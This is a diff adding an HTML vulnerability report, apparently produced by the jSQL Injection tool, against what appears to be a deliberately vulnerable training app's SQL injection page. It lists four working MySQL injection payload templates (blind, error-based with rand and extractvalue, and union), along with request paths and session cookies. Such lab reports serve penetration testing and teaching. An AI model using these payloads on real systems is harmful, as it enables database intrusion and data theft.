@@ -1,0 +1,46 @@
+<html>
+  <head>
+    
+  </head>
+  <body>
+    <span style="white-space: nowrap"><font face="Ubuntu Mono"># Date: 
+    2026-03-13<br style="white-space: nowrap">
+    # Tested on: Windows 11 (10.0)<br style="white-space: nowrap">
+    # Tool: jSQL Injection v0.114 (<a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a>)<br style="white-space: nowrap">
+    # Database: MySQL<br style="white-space: nowrap">
+<br style="white-space: nowrap">
+    ## Vulnerability summary</font></span><br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Blind bit</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010201201';select+1+where(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)--+-BgTE&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:Rand:or</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010201201'or+exists(select+count(*),concat(((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)),floor(rand(0)*2))from+information_schema.tables+group+by+2)--+-qCJO&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Error:Extractvalue</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010201201'or+1=extractvalue(0x0a,concat(0x0a,((<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>))))--+-Eem9&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low<br>
+<br>
+<span><font color="rgb(83,148,236)">### Strategy: Union</font></span><br>
+<span><font color="rgb(128,128,128)">Method: </font></span>GET<br>
+<span><font color="rgb(128,128,128)">Path: </font></span>/vulnerabilities/sqli/<br>
+<span><font color="rgb(128,128,128)">Query: </font></span>id=1010201201'union+select+1,(<span><font color="rgb(41,153,153)">&lt;query&gt;</font></span>)--+-1cPf&amp;Submit=Submit<br>
+<span><font color="rgb(128,128,128)">Header: </font></span>Content-Type: 
+    text/plain<br>
+    Cookie: PHPSESSID=4mrcfutcnhj5e92a4fakbluod3; security=low
+  </body>
+</html>
